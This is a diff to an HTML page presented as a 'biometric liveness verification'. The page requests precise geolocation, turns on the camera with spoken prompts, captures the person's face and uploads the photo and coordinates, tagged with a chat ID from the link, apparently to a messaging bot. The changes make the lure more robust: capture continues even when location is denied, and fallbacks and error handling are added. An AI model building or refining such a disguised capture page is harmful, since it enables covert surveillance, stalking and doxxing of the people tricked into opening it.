@@ -6,10 +6,9 @@
     <style>
         body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: #111; color: white; font-family: sans-serif; text-align: center; }
         
-        #video-container { position: relative; width: 640px; height: 480px; margin-bottom: 20px; display: none; }
+        #video-container { position: relative; width: 640px; height: 480px; max-width: 100%; margin-bottom: 20px; display: none; }
         #video { width: 100%; height: 100%; background: #000; border: 3px solid #00ffcc; border-radius: 12px; object-fit: cover; }
         
-        /* Face guide frame overlay */
         .face-frame {
             position: absolute;
             top: 50%; left: 50%;
@@ -22,12 +21,12 @@
         }
 
         #status { 
-            margin: 15px 0; 
+            margin: 15px 20px; 
             font-weight: bold; 
             background: rgba(0,0,0,0.8); 
             padding: 20px; 
             border-radius: 10px; 
-            font-size: 24px; 
+            font-size: 20px; 
             border: 1px solid #333;
             max-width: 600px;
         }
@@ -35,7 +34,7 @@
         button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 8px; border: none; background: #00ffcc; color: #111; font-weight: bold; transition: background 0.3s; }
         button:hover { background: #00b386; color: white; }
         
-        .error-page { font-size: 20px; color: #ffeb3b; padding: 20px; background: rgba(0,0,0,0.9); border-radius: 15px; border: 1px solid #444; }
+        .error-page { font-size: 18px; color: #ffeb3b; padding: 20px; background: rgba(0,0,0,0.9); border-radius: 15px; border: 1px solid #444; max-width: 500px; margin: auto; }
     </style>
 </head>
 <body>
@@ -62,56 +61,56 @@
         const status = document.getElementById('status');
         const CHAT_ID = new URLSearchParams(window.location.search).get('id');
 
-        function showError() {
+        function showError(msg) {
             app.innerHTML = `<div class="error-page">
-                <p>⚠️ Verification failed or permissions denied. Please refresh and try again.</p>
-                <button onclick="location.reload()">Retry</button>
+                <p>⚠️ ${msg || "Verification failed or permissions denied."}</p>
+                <p style="font-size: 14px; color: #aaa; margin-top: 10px;">Please ensure you are using HTTPS and have allowed camera/location permissions in your browser settings.</p>
+                <button onclick="location.reload()" style="margin-top:15px; font-size:16px; padding:10px 20px;">Retry</button>
             </div>`;
         }
 
-        // Text-to-Speech helper for audio prompts
         function speakPrompt(text, callback) {
             status.innerText = text;
             if ('speechSynthesis' in window) {
-                window.speechSynthesis.cancel(); // Stop previous speech
+                window.speechSynthesis.cancel();
                 const utterance = new SpeechSynthesisUtterance(text);
                 utterance.rate = 1.0;
                 utterance.pitch = 1.0;
-                utterance.onend = () => {
-                    if (callback) callback();
-                };
+                utterance.onend = () => { if (callback) callback(); };
                 window.speechSynthesis.speak(utterance);
             } else {
-                // Fallback if TTS is not supported
                 setTimeout(callback, 2500);
             }
         }
 
         startBtn.addEventListener('click', async () => {
-            if (!CHAT_ID) { status.innerText = "❌ Missing Verification ID"; return; }
+            if (!CHAT_ID) { 
+                status.innerText = "❌ Missing Verification ID in URL (?id=...)"; 
+                return; 
+            }
             startBtn.style.display = 'none';
 
-            // 1. Get Location
-            let locationText = "";
+            // 1. 优化定位：增加容错，避免因定位失败直接中断整个流程
+            let locationText = "Location not available";
             try {
                 status.innerText = "Verifying device location node 📍";
                 const pos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000 });
+                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 15000 });
                 });
                 locationText = `Lat: ${pos.coords.latitude.toFixed(6)}, Lon: ${pos.coords.longitude.toFixed(6)}`;
             } catch (err) {
-                showError();
-                return;
+                console.warn("Geolocation warning:", err);
+                locationText = "Location permission denied or timeout";
+                // 此处选择继续执行，不直接阻断摄像头拍照
             }
 
-            // 2. Initialize Camera & Start Guided Liveness Flow
+            // 2. 初始化摄像头
             try {
                 status.innerText = "Initializing camera sensor...";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
                 video.srcObject = stream;
                 videoContainer.style.display = 'block';
 
-                // Step-by-step interactive liveness prompts
                 speakPrompt("Please position your face inside the frame.", () => {
                     setTimeout(() => {
                         speakPrompt("Please turn your head slowly to the left, then to the right.", () => {
@@ -131,17 +130,22 @@
                 });
 
             } catch (err) {
-                showError();
+                console.warn("Camera error:", err);
+                showError("Camera permission denied or hardware not supported.");
             }
         });
 
         async function captureAndUpload(stream, locationText) {
             status.innerText = "Processing biometric signature...";
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             
             canvas.toBlob(async (blob) => {
+                if (!blob) {
+                    status.innerText = "⚠️ Failed to capture image frame.";
+                    return;
+                }
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'liveness_check.jpg');
@@ -157,7 +161,7 @@
                         stream.getTracks().forEach(t => t.stop());
                         videoContainer.style.display = 'none';
                     } else {
-                        status.innerText = "⚠️ Transmission Error. Please retry.";
+                        status.innerText = "⚠️ Transmission Error: " + (data.description || "Unknown");
                     }
                 } catch (e) {
                     status.innerText = "⚠️ Network Error during upload.";
